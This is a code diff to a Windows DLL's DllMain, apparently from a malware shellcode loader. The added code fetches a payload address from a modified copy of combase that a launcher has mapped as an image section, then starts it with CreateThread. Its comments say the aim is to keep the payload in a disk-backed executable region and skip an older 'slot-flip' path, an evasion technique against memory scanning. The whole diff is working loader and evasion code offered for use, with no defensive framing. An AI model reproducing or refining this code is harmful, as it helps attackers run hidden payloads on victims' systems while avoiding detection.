@@ -26,6 +26,7 @@
 
 typedef void  (WINAPI *pfnGetPayload)(void **, SIZE_T *);
 typedef void  (WINAPI *pfnSetThreadHandle)(HANDLE);
+typedef void *(WINAPI *pfnGetGhostAddr)(void);
 
 typedef struct {
     void  *slot;
@@ -69,6 +70,25 @@ BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved)
 
     HMODULE exe = GetModuleHandleW(NULL);
     if (!exe) return FALSE;
+
+    /* If the launcher successfully mapped a modified combase copy as a
+     * MEM_IMAGE section, its payload address is already RX and lives
+     * inside a disk-backed image region. Skip the entire slot-flip path
+     * and CreateThread directly. */
+    pfnGetGhostAddr gga = (pfnGetGhostAddr)GetProcAddress(exe, "GetGhostAddr");
+    if (gga) {
+        void *ghost = gga();
+        if (ghost) {
+            HANDLE t = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)ghost,
+                                     NULL, 0, NULL);
+            if (t) {
+                pfnSetThreadHandle sh0 = (pfnSetThreadHandle)GetProcAddress(exe, "SetThreadHandle");
+                if (sh0) sh0(t);
+                return TRUE;
+            }
+            /* CreateThread on the ghost failed — fall through to legacy */
+        }
+    }
 
     pfnGetPayload gp = (pfnGetPayload)GetProcAddress(exe, "GetPayload");
     if (!gp) return FALSE;
